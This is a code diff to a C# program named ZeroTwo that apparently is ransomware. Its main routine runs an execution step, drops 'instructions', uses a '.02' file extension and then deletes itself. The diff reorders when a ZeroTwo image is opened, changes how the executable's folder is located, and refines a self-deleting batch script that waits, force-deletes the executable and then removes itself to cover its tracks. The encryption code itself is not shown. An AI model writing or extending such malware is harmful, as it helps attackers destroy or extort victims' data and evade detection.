@@ -9,15 +9,18 @@ namespace ZeroTwo.src {
         private const string EXT = ".02";
 
         public static void Main() {
-            OpenImage();
             Exec();
             ReleaseIstructions();
             SelfDel();
+            OpenImage();
         }
 
         private static void OpenImage() {
             var imageRes = "ZeroTwo.src.ZeroTwo";
-            string imagePath = "C:/Users/" + Environment.UserName + "/Desktop/ZeroTwo.jpg";
+            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
+            int index = exePath.LastIndexOf("/");
+            string exeFolder = exePath.Substring(0, index);
+            string imagePath = (exeFolder + "/ZeroTwo.jpg").Replace("/", "\\");
 
             try {
                 if (File.Exists(imagePath))
@@ -43,12 +46,12 @@ namespace ZeroTwo.src {
 
         private static void SelfDel() {
             string batchCommands = string.Empty;
-            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
+            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
 
             batchCommands += "@ECHO OFF\n";                         // Do not show any output
             batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
             batchCommands += "echo j | del /F ";                    // Delete the executeable
-            batchCommands += exeFileName + "\n";
+            batchCommands += "\"" + exePath + "\"" + "\n";
             batchCommands += "echo j | del del.bat";    // Delete this bat file
 
             File.WriteAllText("del.bat", batchCommands);
